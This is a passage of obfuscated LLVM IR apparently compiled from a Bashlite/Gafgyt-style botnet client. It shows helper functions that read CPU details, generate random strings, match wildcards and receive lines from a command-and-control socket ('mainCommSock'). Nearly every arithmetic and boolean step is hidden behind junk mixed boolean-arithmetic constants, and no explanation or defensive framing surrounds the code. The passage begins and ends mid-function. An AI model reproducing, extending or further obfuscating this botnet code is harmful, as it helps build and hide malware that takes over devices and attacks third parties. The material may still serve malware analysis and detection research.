; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %67

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 %57, -1
  %59 = xor i32 65280, -1
  %60 = xor i32 477626683, -1
  %61 = or i32 %58, %59
  %62 = or i32 477626683, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65280
  %66 = ashr i32 %64, 8
  br label %67

; <label>:67:                                     ; preds = %53, %52
  %68 = phi i32 [ -1, %52 ], [ %66, %53 ]
  store i32 %68, i32* %2, align 4
  br label %69

; <label>:69:                                     ; preds = %67, %19
  %70 = load i32, i32* %2, align 4
  ret i32 %70
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add i32 %35, 383317011
  %37 = add i32 %36, 1
  %38 = sub i32 %37, 383317011
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %27

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = and i64 %16, %22
  %24 = xor i64 %16, %22
  %25 = or i64 %23, %24
  %26 = or i64 %16, %22
  store i64 %25, i64* %3, align 8
  br label %4

; <label>:27:                                     ; preds = %12
  %28 = load i64, i64* %3, align 8
  ret i64 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %94 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %131

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 false, %30
  %32 = xor i1 false, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, false
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, true
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %131

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %80

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 false, %69
  %71 = xor i1 false, true
  %72 = and i1 %68, %71
  %73 = xor i1 true, true
  %74 = and i1 %73, false
  %75 = and i1 true, %71
  %76 = or i1 %70, %72
  %77 = or i1 %74, %75
  %78 = xor i1 %76, %77
  %79 = xor i1 %68, true
  br label %80

; <label>:80:                                     ; preds = %62, %57
  %81 = phi i1 [ false, %57 ], [ %78, %62 ]
  %82 = xor i1 %81, true
  %83 = and i1 true, %82
  %84 = xor i1 true, true
  %85 = and i1 %81, %84
  %86 = xor i1 true, true
  %87 = and i1 %86, true
  %88 = and i1 true, %84
  %89 = or i1 %83, %85
  %90 = or i1 %87, %88
  %91 = xor i1 %89, %90
  %92 = xor i1 %81, true
  %93 = zext i1 %91 to i32
  store i32 %93, i32* %3, align 4
  br label %131

; <label>:94:                                     ; preds = %2
  %95 = load i8*, i8** %4, align 8
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 @toupper(i32 %97) #10
  %99 = load i8*, i8** %5, align 8
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = call i32 @toupper(i32 %101) #10
  %103 = icmp eq i32 %98, %102
  br i1 %103, label %104, label %117

; <label>:104:                                    ; preds = %94
  %105 = load i8*, i8** %4, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  %107 = load i8*, i8** %5, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i32 @wildString(i8* %106, i8* %108)
  %110 = icmp ne i32 %109, 0
  %111 = xor i1 %110, true
  %112 = and i1 true, %111
  %113 = xor i1 true, true
  %114 = and i1 %110, %113
  %115 = or i1 %112, %114
  %116 = xor i1 %110, true
  br label %117

; <label>:117:                                    ; preds = %104, %94
  %118 = phi i1 [ false, %94 ], [ %115, %104 ]
  %119 = xor i1 %118, true
  %120 = and i1 false, %119
  %121 = xor i1 false, true
  %122 = and i1 %118, %121
  %123 = xor i1 true, true
  %124 = and i1 %123, false
  %125 = and i1 true, %121
  %126 = or i1 %120, %122
  %127 = or i1 %124, %125
  %128 = xor i1 %126, %127
  %129 = xor i1 %118, true
  %130 = zext i1 %128 to i32
  store i32 %130, i32* %3, align 4
  br label %131

; <label>:131:                                    ; preds = %117, %80, %43, %9
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %91, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %93

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %91

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = add i64 %46, 8504387509927590214
  %48 = sub i64 %47, 1
  %49 = sub i64 %48, 8504387509927590214
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = add i64 %58, -6399746218819132985
  %60 = sub i64 %59, 1
  %61 = sub i64 %60, -6399746218819132985
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %78

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = sub i64 %72, 6252950090275862858
  %74 = sub i64 %73, 1
  %75 = add i64 %74, 6252950090275862858
  %76 = sub i64 %72, 1
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  store i8 0, i8* %77, align 1
  br label %43

; <label>:78:                                     ; preds = %67
  %79 = load i8*, i8** %6, align 8
  %80 = call i8* @strchr(i8* %79, i32 46) #10
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %6, align 8
  %84 = call i8* @strchr(i8* %83, i32 46) #10
  store i8 0, i8* %84, align 1
  br label %85

; <label>:85:                                     ; preds = %82, %78
  %86 = load i8*, i8** %3, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = call i8* @strcpy(i8* %86, i8* %87) #2
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  store i32 0, i32* %2, align 4
  br label %96

; <label>:91:                                     ; preds = %13
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:93:                                     ; preds = %8
  %94 = load i32, i32* %4, align 4
  %95 = call i32 @close(i32 %94)
  store i32 1, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %93, %85
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %22, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %24

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 %17, 639934543
  %19 = add i32 %18, 1
  %20 = add i32 %19, 639934543
  %21 = add nsw i32 %17, 1
  store i32 %20, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %16, %10
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:24:                                     ; preds = %5
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  %27 = load i32, i32* %1, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %23, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, %12
  %14 = sub i32 0, 65
  %15 = add i32 %13, %14
  %16 = sub i32 0, %15
  %17 = add i32 %12, 65
  %18 = trunc i32 %16 to i8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

; <label>:23:                                     ; preds = %10
  %24 = load i32, i32* %5, align 4
  %25 = add i32 %24, -218090946
  %26 = add i32 %25, 1
  %27 = sub i32 %26, -218090946
  %28 = add nsw i32 %24, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 2240818596691245322, -1
  %47 = and i64 %44, 2240818596691245322
  %48 = and i64 %43, %46
  %49 = and i64 %45, 2240818596691245322
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 2240818596691245322, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 0, 1
  %62 = sub i32 %60, %61
  %63 = add nsw i32 %60, 1
  %64 = call i32 @select(i32 %62, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %64, i32* %12, align 4
  %65 = icmp sle i32 %64, 0
  br i1 %65, label %66, label %114

; <label>:66:                                     ; preds = %33
  br label %67

; <label>:67:                                     ; preds = %106, %66
  %68 = load i32, i32* %13, align 4
  %69 = icmp slt i32 %68, 10
  br i1 %69, label %70, label %113

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0))
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %73, align 8
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %74, align 8
  br label %75

; <label>:75:                                     ; preds = %70
  %76 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %76, i64 0, i64 0
  %78 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %77) #2, !srcloc !2
  %79 = extractvalue { i64, i64* } %78, 0
  %80 = extractvalue { i64, i64* } %78, 1
  %81 = trunc i64 %79 to i32
  store i32 %81, i32* %14, align 4
  %82 = ptrtoint i64* %80 to i64
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %15, align 4
  br label %84

; <label>:84:                                     ; preds = %75
  %85 = load i32, i32* %5, align 4
  %86 = srem i32 %85, 64
  %87 = zext i32 %86 to i64
  %88 = shl i64 1, %87
  %89 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %90 = load i32, i32* %5, align 4
  %91 = sdiv i32 %90, 64
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = and i64 %94, %88
  %96 = xor i64 %94, %88
  %97 = or i64 %95, %96
  %98 = or i64 %94, %88
  store i64 %97, i64* %93, align 8
  %99 = load i32, i32* %5, align 4
  %100 = sub i32 %99, 38295806
  %101 = add i32 %100, 1
  %102 = add i32 %101, 38295806
  %103 = add nsw i32 %99, 1
  %104 = call i32 @select(i32 %102, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %104, i32* %12, align 4
  %105 = icmp sle i32 %104, 0
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %84
  %107 = load i32, i32* %13, align 4
  %108 = sub i32 %107, -1901827922
  %109 = add i32 %108, 1
  %110 = add i32 %109, -1901827922
  %111 = add nsw i32 %107, 1
  store i32 %110, i32* %13, align 4
  br label %67

; <label>:112:                                    ; preds = %84
  br label %113

; <label>:113:                                    ; preds = %112, %67
  br label %114

; <label>:114:                                    ; preds = %113, %33
  store i32 0, i32* %18, align 4
  %115 = load i8*, i8** %6, align 8
  store i8* %115, i8** %17, align 8
  br label %116

; <label>:116:                                    ; preds = %136, %114
  %117 = load i32, i32* %7, align 4
  %118 = sub i32 0, -1
  %119 = sub i32 %117, %118
  %120 = add nsw i32 %117, -1
  store i32 %119, i32* %7, align 4
  %121 = icmp sgt i32 %117, 1
  br i1 %121, label %122, label %143

; <label>:122:                                    ; preds = %116
  %123 = load i32, i32* @mainCommSock, align 4
  %124 = call i64 @recv(i32 %123, i8* %16, i64 1, i32 0)
  %125 = icmp ne i64 %124, 1
  br i1 %125, label %126, label %128

; <label>:126:                                    ; preds = %122
  %127 = load i8*, i8** %17, align 8
  store i8 0, i8* %127, align 1
  store i32 -1, i32* %4, align 4
  br label %146

; <label>:128:                                    ; preds = %122
  %129 = load i8, i8* %16, align 1
  %130 = load i8*, i8** %17, align 8
